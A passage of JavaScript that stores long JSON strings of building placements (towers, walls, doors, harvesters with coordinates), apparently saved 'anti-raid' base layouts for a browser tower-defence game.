-528,\"type\":\"MagicTower\",\"tier\":1},\"105858664\":{\"x\":-192,\"y\":-528,\"type\":\"MagicTower\",\"tier\":1},\"105858665\":{\"x\":-96,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"105858666\":{\"x\":96,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"105858667\":{\"x\":192,\"y\":-528,\"type\":\"MagicTower\",\"tier\":1},\"105858668\":{\"x\":288,\"y\":-528,\"type\":\"MagicTower\",\"tier\":1},\"105858669\":{\"x\":384,\"y\":-480,\"type\":\"MagicTower\",\"tier\":1},\"105858670\":{\"x\":264,\"y\":-600,\"type\":\"Wall\",\"tier\":1},\"105858671\":{\"x\":264,\"y\":-648,\"type\":\"Door\",\"tier\":1},\"105858672\":{\"x\":216,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858673\":{\"x\":312,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858674\":{\"x\":120,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105858677\":{\"x\":72,\"y\":-552,\"type\":\"Wall\",\"tier\":1},\"105858678\":{\"x\":72,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858679\":{\"x\":24,\"y\":-600,\"type\":\"SlowTrap\",\"tier\":1},\"105858680\":{\"x\":-24,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858681\":{\"x\":-72,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105858682\":{\"x\":-120,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105858683\":{\"x\":-264,\"y\":-600,\"type\":\"Wall\",\"tier\":1},\"105858684\":{\"x\":-264,\"y\":-648,\"type\":\"Door\",\"tier\":1},\"105858685\":{\"x\":-216,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858686\":{\"x\":-312,\"y\":-600,\"type\":\"Door\",\"tier\":1},\"105858688\":{\"x\":-360,\"y\":-504,\"type\":\"Wall\",\"tier\":1},\"105858689\":{\"x\":-360,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105858690\":{\"x\":-408,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"105858691\":{\"x\":-384,\"y\":-432,\"type\":\"MagicTower\",\"tier\":1},\"105858692\":{\"x\":-384,\"y\":-336,\"type\":\"MagicTower\",\"tier\":1},\"105858693\":{\"x\":-384,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"105858694\":{\"x\":-384,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105858695\":{\"x\":-384,\"y\":0,\"type\":\"MagicTower\",\"tier\":1},\"105858696\":{\"x\":-384,\"y\":144,\"type\":\"MagicTower\",\"tier\":1},\"105858697\":{\"x\":-384,\"y\":240,\"type\":\"MagicTower\",\"tier\":1},\"105858698\":{\"x\":-408,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105858699\":{\"x\":-360,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105858700\":{\"x\":-360,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105858701\":{\"x\":-408,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105858702\":{\"x\":-288,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"105858703\":{\"x\":-192,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105858704\":{\"x\":-96,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"105858705\":{\"x\":96,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"105858706\":{\"x\":192,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105858707\":{\"x\":288,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"105858708\":{\"x\":384,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105858709\":{\"x\":480,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105858710\":{\"x\":576,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105858711\":{\"x\":576,\"y\":0,\"type\":\"CannonTower\",\"tier\":1},\"105858712\":{\"x\":576,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105858713\":{\"x\":576,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105858714\":{\"x\":576,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105858715\":{\"x\":480,\"y\":-384,\"type\":\"ArrowTower\",\"tier\":1},\"105858716\":{\"x\":480,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"105858717\":{\"x\":480,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"105858718\":{\"x\":480,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"105858719\":{\"x\":480,\"y\":0,\"type\":\"ArrowTower\",\"tier\":1},\"105858720\":{\"x\":480,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105858721\":{\"x\":384,\"y\":-288,\"type\":\"ArrowTower\",\"tier\":1},\"105858722\":{\"x\":288,\"y\":-240,\"type\":\"ArrowTower\",\"tier\":1},\"105858723\":{\"x\":168,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105858724\":{\"x\":216,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105858725\":{\"x\":216,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"105858726\":{\"x\":168,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"105858727\":{\"x\":-288,\"y\":-240,\"type\":\"CannonTower\",\"tier\":1},\"105858728\":{\"x\":-288,\"y\":-144,\"type\":\"CannonTower\",\"tier\":1},\"105858729\":{\"x\":-288,\"y\":-48,\"type\":\"CannonTower\",\"tier\":1},\"105858730\":{\"x\":-288,\"y\":48,\"type\":\"CannonTower\",\"tier\":1},\"105858731\":{\"x\":-288,\"y\":144,\"type\":\"CannonTower\",\"tier\":1},\"105858732\":{\"x\":-288,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"105858733\":{\"x\":-192,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105858734\":{\"x\":-96,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"105858735\":{\"x\":-192,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105858736\":{\"x\":192,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105858737\":{\"x\":96,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"105858738\":{\"x\":192,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105858739\":{\"x\":288,\"y\":240,\"type\":\"CannonTower\",\"tier\":1},\"105858740\":{\"x\":384,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105858776\":{\"x\":-24,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105858777\":{\"x\":-24,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105858794\":{\"x\":-24,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105858862\":{\"x\":24,\"y\":-168,\"type\":\"SlowTrap\",\"tier\":1},\"105858867\":{\"x\":24,\"y\":-120,\"type\":\"SlowTrap\",\"tier\":1},\"105858880\":{\"x\":24,\"y\":-72,\"type\":\"SlowTrap\",\"tier\":1},\"105859360\":{\"x\":360,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105859385\":{\"x\":408,\"y\":-552,\"type\":\"Door\",\"tier\":1},\"105859437\":{\"x\":456,\"y\":-456,\"type\":\"Wall\",\"tier\":1},\"105859489\":{\"x\":456,\"y\":-504,\"type\":\"Door\",\"tier\":1},\"105859513\":{\"x\":504,\"y\":-456,\"type\":\"Door\",\"tier\":1},\"105859861\":{\"x\":552,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105859885\":{\"x\":552,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105859906\":{\"x\":600,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105860053\":{\"x\":552,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105860087\":{\"x\":600,\"y\":168,\"type\":\"Door\",\"tier\":1},\"105860106\":{\"x\":552,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105860118\":{\"x\":456,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105860143\":{\"x\":504,\"y\":264,\"type\":\"Door\",\"tier\":1},\"105860168\":{\"x\":456,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105860441\":{\"x\":408,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105860850\":{\"x\":360,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105860851\":{\"x\":264,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105860852\":{\"x\":120,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105860853\":{\"x\":312,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105860854\":{\"x\":72,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105860855\":{\"x\":-72,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105860856\":{\"x\":-120,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105860857\":{\"x\":-264,\"y\":408,\"type\":\"Wall\",\"tier\":1},\"105860858\":{\"x\":-312,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105860859\":{\"x\":-360,\"y\":312,\"type\":\"Wall\",\"tier\":1},\"105860860\":{\"x\":-408,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105860861\":{\"x\":-360,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105860862\":{\"x\":648,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105860863\":{\"x\":648,\"y\":-216,\"type\":\"Wall\",\"tier\":1},\"105860864\":{\"x\":648,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105860865\":{\"x\":648,\"y\":-120,\"type\":\"Wall\",\"tier\":1},\"105860866\":{\"x\":648,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105860867\":{\"x\":648,\"y\":-24,\"type\":\"Wall\",\"tier\":1},\"105860868\":{\"x\":648,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105860869\":{\"x\":648,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105860870\":{\"x\":0,\"y\":-240,\"type\":\"Harvester\",\"tier\":1},\"105860871\":{\"x\":0,\"y\":-336,\"type\":\"Harvester\",\"tier\":1},\"105860872\":{\"x\":0,\"y\":-432,\"type\":\"Harvester\",\"tier\":1},\"105860873\":{\"x\":0,\"y\":-528,\"type\":\"Harvester\",\"tier\":1},\"105860874\":{\"x\":0,\"y\":96,\"type\":\"Harvester\",\"tier\":1},\"105860875\":{\"x\":0,\"y\":192,\"type\":\"Harvester\",\"tier\":1},\"105860876\":{\"x\":0,\"y\":288,\"type\":\"Harvester\",\"tier\":1},\"105860877\":{\"x\":0,\"y\":384,\"type\":\"Harvester\",\"tier\":1}}";
let antiRaidBaseBottomLeft = "{\"105860879\":{\"x\":-96,\"y\":-48,\"type\":\"BombTower\",\"tier\":1},\"105860880\":{\"x\":-96,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105860881\":{\"x\":96,\"y\":-48,\"type\":\"BombTower\",\"tier\":1},\"105860882\":{\"x\":96,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105860883\":{\"x\":96,\"y\":-144,\"type\":\"ArrowTower\",\"tier\":1},\"105860884\":{\"x\":-96,\"y\":-144,\"type\":\"ArrowTower\",\"tier\":1},\"105860885\":{\"x\":-96,\"y\":144,\"type\":\"GoldMine\",\"tier\":1},\"105860886\":{\"x\":96,\"y\":144,\"type\":\"GoldMine\",\"tier\":1},\"105860887\":{\"x\":24,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105860888\":{\"x\":-24,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105860889\":{\"x\":-24,\"y\":120,\"type\":\"Wall\",\"tier\":1},\"105860890\":{\"x\":-24,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105860891\":{\"x\":24,\"y\":120,\"type\":\"SlowTrap\",\"tier\":1},\"105860892\":{\"x\":24,\"y\":168,\"type\":\"SlowTrap\",\"tier\":1},\"105860949\":{\"x\":0,\"y\":-96,\"type\":\"Harvester\",\"tier\":1},\"105860956\":{\"x\":0,\"y\":-192,\"type\":\"Harvester\",\"tier\":1},\"105860962\":{\"x\":0,\"y\":-288,\"type\":\"Harvester\",\"tier\":1},\"105860969\":{\"x\":0,\"y\":-384,\"type\":\"Harvester\",\"tier\":1},\"105861021\":{\"x\":-96,\"y\":-336,\"type\":\"MagicTower\",\"tier\":1},\"105861035\":{\"x\":-192,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105861068\":{\"x\":96,\"y\":-336,\"type\":\"MagicTower\",\"tier\":1},\"105861099\":{\"x\":-120,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105861108\":{\"x\":-264,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105861121\":{\"x\":-312,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105861132\":{\"x\":-72,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105861145\":{\"x\":120,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105861170\":{\"x\":264,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105861175\":{\"x\":312,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105861178\":{\"x\":72,\"y\":-408,\"type\":\"Door\",\"tier\":1},\"105861181\":{\"x\":192,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105861190\":{\"x\":-288,\"y\":-336,\"type\":\"MagicTower\",\"tier\":1},\"105861191\":{\"x\":-384,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105861192\":{\"x\":288,\"y\":-336,\"type\":\"MagicTower\",\"tier\":1},\"105861194\":{\"x\":-360,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105861195\":{\"x\":-408,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105861198\":{\"x\":-456,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105861199\":{\"x\":-456,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105861200\":{\"x\":-504,\"y\":-264,\"type\":\"Door\",\"tier\":1},\"105861201\":{\"x\":-552,\"y\":-168,\"type\":\"Wall\",\"tier\":1},\"105861202\":{\"x\":-552,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105861203\":{\"x\":-600,\"y\":-168,\"type\":\"Door\",\"tier\":1},\"105861204\":{\"x\":-480,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105861205\":{\"x\":-480,\"y\":-96,\"type\":\"CannonTower\",\"tier\":1},\"105861207\":{\"x\":-480,\"y\":0,\"type\":\"CannonTower\",\"tier\":1},\"105861208\":{\"x\":-576,\"y\":0,\"type\":\"CannonTower\",\"tier\":1},\"105861209\":{\"x\":-480,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105861210\":{\"x\":-576,\"y\":192,\"type\":\"CannonTower\",\"tier\":1},\"105861211\":{\"x\":-480,\"y\":288,\"type\":\"CannonTower\",\"tier\":1},\"105861212\":{\"x\":-480,\"y\":384,\"type\":\"CannonTower\",\"tier\":1},\"105861213\":{\"x\":-576,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105861214\":{\"x\":-576,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105861215\":{\"x\":-576,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105861216\":{\"x\":-480,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105861217\":{\"x\":-384,\"y\":0,\"type\":\"ArrowTower\",\"tier\":1},\"105861218\":{\"x\":-384,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105861219\":{\"x\":-384,\"y\":192,\"type\":\"ArrowTower\",\"tier\":1},\"105861220\":{\"x\":-384,\"y\":-192,\"type\":\"ArrowTower\",\"tier\":1},\"105861221\":{\"x\":-384,\"y\":384,\"type\":\"ArrowTower\",\"tier\":1},\"105861222\":{\"x\":-384,\"y\":288,\"type\":\"GoldMine\",\"tier\":1},\"105861223\":{\"x\":-384,\"y\":-96,\"type\":\"GoldMine\",\"tier\":1},\"105861224\":{\"x\":-384,\"y\":480,\"type\":\"MagicTower\",\"tier\":1},\"105861225\":{\"x\":-288,\"y\":528,\"type\":\"MagicTower\",\"tier\":1},\"105861226\":{\"x\":-192,\"y\":528,\"type\":\"MagicTower\",\"tier\":1},\"105861227\":{\"x\":-96,\"y\":480,\"type\":\"MagicTower\",\"tier\":1},\"105861228\":{\"x\":96,\"y\":480,\"type\":\"MagicTower\",\"tier\":1},\"105861229\":{\"x\":192,\"y\":528,\"type\":\"MagicTower\",\"tier\":1},\"105861230\":{\"x\":288,\"y\":528,\"type\":\"MagicTower\",\"tier\":1},\"105861231\":{\"x\":384,\"y\":432,\"type\":\"MagicTower\",\"tier\":1},\"105861232\":{\"x\":384,\"y\":336,\"type\":\"MagicTower\",\"tier\":1},\"105861233\":{\"x\":360,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105861234\":{\"x\":408,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105861235\":{\"x\":384,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"105861236\":{\"x\":384,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105861237\":{\"x\":384,\"y\":0,\"type\":\"MagicTower\",\"tier\":1},\"105861238\":{\"x\":360,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105861239\":{\"x\":408,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105861240\":{\"x\":384,\"y\":-144,\"type\":\"MagicTower\",\"tier\":1},\"105861241\":{\"x\":384,\"y\":-240,\"type\":\"MagicTower\",\"tier\":1},\"105861242\":{\"x\":360,\"y\":-312,\"type\":\"Wall\",\"tier\":1},\"105861243\":{\"x\":408,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105861244\":{\"x\":360,\"y\":-360,\"type\":\"Door\",\"tier\":1},\"105861246\":{\"x\":96,\"y\":-240,\"type\":\"CannonTower\",\"tier\":1},\"105861247\":{\"x\":192,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105861248\":{\"x\":192,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105861249\":{\"x\":288,\"y\":-240,\"type\":\"CannonTower\",\"tier\":1},\"105861250\":{\"x\":288,\"y\":-144,\"type\":\"CannonTower\",\"tier\":1},\"105861251\":{\"x\":288,\"y\":336,\"type\":\"CannonTower\",\"tier\":1},\"105861252\":{\"x\":288,\"y\":432,\"type\":\"CannonTower\",\"tier\":1},\"105861254\":{\"x\":192,\"y\":432,\"type\":\"CannonTower\",\"tier\":1},\"105861255\":{\"x\":96,\"y\":384,\"type\":\"CannonTower\",\"tier\":1},\"105861256\":{\"x\":-96,\"y\":384,\"type\":\"CannonTower\",\"tier\":1},\"105861257\":{\"x\":-192,\"y\":432,\"type\":\"CannonTower\",\"tier\":1},\"105861258\":{\"x\":-96,\"y\":-240,\"type\":\"CannonTower\",\"tier\":1},\"105861259\":{\"x\":-192,\"y\":-288,\"type\":\"CannonTower\",\"tier\":1},\"105861260\":{\"x\":-192,\"y\":-192,\"type\":\"CannonTower\",\"tier\":1},\"105861261\":{\"x\":-288,\"y\":-240,\"type\":\"CannonTower\",\"tier\":1},\"105861262\":{\"x\":-288,\"y\":-144,\"type\":\"CannonTower\",\"tier\":1},\"105861263\":{\"x\":-96,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105861264\":{\"x\":-192,\"y\":336,\"type\":\"ArrowTower\",\"tier\":1},\"105861265\":{\"x\":-288,\"y\":432,\"type\":\"ArrowTower\",\"tier\":1},\"105861266\":{\"x\":96,\"y\":288,\"type\":\"ArrowTower\",\"tier\":1},\"105861267\":{\"x\":192,\"y\":336,\"type\":\"ArrowTower\",\"tier\":1},\"105861268\":{\"x\":-216,\"y\":168,\"type\":\"Door\",\"tier\":1},\"105861269\":{\"x\":-168,\"y\":168,\"type\":\"Door\",\"tier\":1},\"105861270\":{\"x\":-168,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105861271\":{\"x\":-216,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105861272\":{\"x\":-72,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105861273\":{\"x\":-120,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105861274\":{\"x\":-168,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105861275\":{\"x\":-216,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105861276\":{\"x\":72,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105861277\":{\"x\":120,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105861278\":{\"x\":168,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105861279\":{\"x\":216,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105861290\":{\"x\":192,\"y\":240,\"type\":\"GoldMine\",\"tier\":1},\"105861557\":{\"x\":288,\"y\":-48,\"type\":\"ArrowTower\",\"tier\":1},\"105861567\":{\"x\":288,\"y\":48,\"type\":\"ArrowTower\",\"tier\":1},\"105861583\":{\"x\":288,\"y\":144,\"type\":\"ArrowTower\",\"tier\":1},\"105861610\":{\"x\":288,\"y\":240,\"type\":\"ArrowTower\",\"tier\":1},\"105862016\":{\"x\":-192,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105862059\":{\"x\":-288,\"y\":48,\"type\":\"BombTower\",\"tier\":1},\"105862076\":{\"x\":-288,\"y\":-48,\"type\":\"BombTower\",\"tier\":1},\"105862169\":{\"x\":-192,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105862208\":{\"x\":-192,\"y\":0,\"type\":\"BombTower\",\"tier\":1},\"105862280\":{\"x\":192,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105862282\":{\"x\":192,\"y\":0,\"type\":\"BombTower\",\"tier\":1},\"105862321\":{\"x\":192,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105862718\":{\"x\":-288,\"y\":144,\"type\":\"GoldMine\",\"tier\":1},\"105862738\":{\"x\":-288,\"y\":240,\"type\":\"GoldMine\",\"tier\":1},\"105862745\":{\"x\":-288,\"y\":336,\"type\":\"GoldMine\",\"tier\":1},\"105863299\":{\"x\":-648,\"y\":-72,\"type\":\"Wall\",\"tier\":1},\"105863304\":{\"x\":-648,\"y\":-24,\"type\":\"Wall\",\"tier\":1},\"105863305\":{\"x\":-648,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105863309\":{\"x\":-648,\"y\":72,\"type\":\"Wall\",\"tier\":1},\"105863319\":{\"x\":-648,\"y\":120,\"type\":\"Wall\",\"tier\":1},\"105863320\":{\"x\":-648,\"y\":168,\"type\":\"Wall\",\"tier\":1},\"105863321\":{\"x\":-648,\"y\":216,\"type\":\"Wall\",\"tier\":1},\"105863322\":{\"x\":-648,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105863550\":{\"x\":360,\"y\":504,\"type\":\"Wall\",\"tier\":1},\"105863551\":{\"x\":408,\"y\":504,\"type\":\"Door\",\"tier\":1},\"105863552\":{\"x\":360,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863553\":{\"x\":264,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"105863554\":{\"x\":312,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863555\":{\"x\":264,\"y\":648,\"type\":\"Door\",\"tier\":1},\"105863556\":{\"x\":216,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863557\":{\"x\":-264,\"y\":600,\"type\":\"Wall\",\"tier\":1},\"105863558\":{\"x\":-216,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863559\":{\"x\":-264,\"y\":648,\"type\":\"Door\",\"tier\":1},\"105863560\":{\"x\":-312,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863561\":{\"x\":-360,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863562\":{\"x\":-408,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863563\":{\"x\":-456,\"y\":456,\"type\":\"Wall\",\"tier\":1},\"105863564\":{\"x\":-504,\"y\":456,\"type\":\"Door\",\"tier\":1},\"105863565\":{\"x\":-456,\"y\":504,\"type\":\"Door\",\"tier\":1},\"105863566\":{\"x\":-552,\"y\":360,\"type\":\"Wall\",\"tier\":1},\"105863567\":{\"x\":-600,\"y\":360,\"type\":\"Door\",\"tier\":1},\"105863568\":{\"x\":-552,\"y\":408,\"type\":\"Door\",\"tier\":1},\"105863571\":{\"x\":-72,\"y\":552,\"type\":\"Wall\",\"tier\":1},\"105863572\":{\"x\":-120,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863573\":{\"x\":-72,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863574\":{\"x\":-24,\"y\":600,\"type\":\"SlowTrap\",\"tier\":1},\"105863575\":{\"x\":24,\"y\":600,\"type\":\"Door\",\"tier\":1},\"105863576\":{\"x\":72,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863577\":{\"x\":120,\"y\":552,\"type\":\"Door\",\"tier\":1},\"105863578\":{\"x\":0,\"y\":240,\"type\":\"Harvester\",\"tier\":1},\"105863579\":{\"x\":0,\"y\":336,\"type\":\"Harvester\",\"tier\":1},\"105863580\":{\"x\":0,\"y\":432,\"type\":\"Harvester\",\"tier\":1},\"105863581\":{\"x\":0,\"y\":528,\"type\":\"Harvester\",\"tier\":1}}";
let antiRaidBaseBottomRight = "{\"105863585\":{\"x\":48,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105863586\":{\"x\":-48,\"y\":96,\"type\":\"BombTower\",\"tier\":1},\"105863587\":{\"x\":144,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105863588\":{\"x\":48,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105863589\":{\"x\":-48,\"y\":-96,\"type\":\"BombTower\",\"tier\":1},\"105863590\":{\"x\":-144,\"y\":-96,\"type\":\"ArrowTower\",\"tier\":1},\"105863591\":{\"x\":-144,\"y\":96,\"type\":\"ArrowTower\",\"tier\":1},\"105863593\":{\"x\":168,\"y\":-24,\"type\":\"Wall\",\"tier\":1},\"105863594\":{\"x\":120,\"y\":-24,\"type\":\"Wall\",\"tier\":1},\"105863595\":{\"x\":72,\"y\":-24,\"type\":\"Wall\",\"tier\":1},\"105863596\":{\"x\":72,\"y\":24,\"type\":\"Wall\",\"tier\":1},\"105863597\":{\"x\":120,\"y\":24,\"type\":\"SlowTrap\",\"tier\":1},\"105863598\":{\"x\":168,\"y\":24,\"type\":\"SlowTrap\",\"tier\":1},\"105863599\":{\"x\":-96,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105863600\":{\"x\":-192,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105863601\":{\"x\":-288,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105863602\":{\"x\":-384,\"y\":0,\"type\":\"Harvester\",\"tier\":1},\"105863603\":{\"x\":-336,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105863604\":{\"x\":-384,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"105863605\":{\"x\":-336,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105863606\":{\"x\":-384,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"105863607\":{\"x\":-336,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105863608\":{\"x\":-240,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863609\":{\"x\":-144,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863610\":{\"x\":0,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863611\":{\"x\":96,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863612\":{\"x\":192,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863613\":{\"x\":336,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863614\":{\"x\":432,\"y\":-384,\"type\":\"MagicTower\",\"tier\":1},\"105863615\":{\"x\":-72,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105863616\":{\"x\":-72,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105863617\":{\"x\":264,\"y\":-408,\"type\":\"Wall\",\"tier\":1},\"105863618\":{\"x\":264,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105863619\":{\"x\":528,\"y\":-288,\"type\":\"MagicTower\",\"tier\":1},\"105863620\":{\"x\":528,\"y\":-192,\"type\":\"MagicTower\",\"tier\":1},\"105863621\":{\"x\":480,\"y\":-96,\"type\":\"MagicTower\",\"tier\":1},\"105863622\":{\"x\":480,\"y\":96,\"type\":\"MagicTower\",\"tier\":1},\"105863623\":{\"x\":528,\"y\":192,\"type\":\"MagicTower\",\"tier\":1},\"105863624\":{\"x\":528,\"y\":288,\"type\":\"MagicTower\",\"tier\":1},\"105863625\":{\"x\":480,\"y\":384,\"type\":\"MagicTower\",\"tier\":1},\"105863626\":{\"x\":600,\"y\":264,\"type\":\"Wall\",\"tier\":1},\"105863627\":{\"x\":600,\"y\":216,\"type\":\"Door\",\"tier\":1},\"105863628\":{\"x\":648,\"y\":264,\"type\":\"Door\",\"tier\":1},\"105863629\":{\"x\":600,\"y\":312,\"type\":\"Door\",\"tier\":1},\"105863630\":{\"x\":600,\"y\":-264,\"type\":\"Wall\",\"tier\":1},\"105863631\":{\"x\":600,\"y\":-312,\"type\":\"Door\",\"tier\":1},\"105863632\":{\"x\":648,\"y\":-264,\"type\":\"Door\",\"tier\":1},\"105863633\":{\"x\":600,\"y\":-216,\"type\":\"Door\",\"tier\":1},\"105863634\":{\"x\":504,\"y\":-360,\"type\":\"Wall\",\"tier\":1},\"105863635\":{\"x\":504,\"y\":-408,\"type\":\"Door\